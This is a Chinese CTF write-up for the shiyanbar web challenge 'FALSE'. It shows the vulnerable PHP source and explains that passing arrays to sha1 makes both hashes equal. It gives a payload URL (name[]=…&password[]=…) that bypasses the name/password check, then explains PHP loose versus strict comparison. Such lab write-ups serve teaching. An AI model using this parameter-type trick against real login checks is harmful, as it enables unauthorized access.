### 记sha1函数的一次绕过
>题目名：FALSE

>题目来源http://www.shiyanbar.com/ctf/1787

>通关地址：http://ctf5.shiyanbar.com/web/false.php
#### 源码
```php
<?php
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
	echo '<p>Login first!</p>';
?>

```

#### 分析
该页面需要提交name和password两个参数。

若想获得flag，要求两个参数的值必须不相等。同时，两个参数通过sha1函数加密后的返回值必须相同。

表面上两个条件是矛盾的，但是sha1函数不能加密数组，数组作为参数会返回false。利用这个条件即可绕过限制得到flag。

#### payload
```
http://ctf5.shiyanbar.com/web/false.php?name[]=name&password[]=pass
```

#### 拓展内容
关于php中的等号

两个=是进行比较，但是只比较值而不会比较数据的类型。如果两个数据的类型不一样的话，会先转换成一样的。
```php
<?php
    $s = "abs";
    if($s==0)
        echo "true";
    else
        echo "false";
#该例子打印的结果为true，对于字符串，和数字比较时先转换成数字。
#转换规则是，从字符串开头开始，到第一个非法字符串结束，得到转换的结果。如果开头就是发发字符串，则转换为0。
?>
```
三个=也是进行比较，但是既比较类型，又比较值。
```php
<?php
    $s = "abs";
    if($s===0)
        echo "true";
    else
        echo "false";
#该例子打印的结果为flase，因为两个比较的变量的类型不同
?>
```

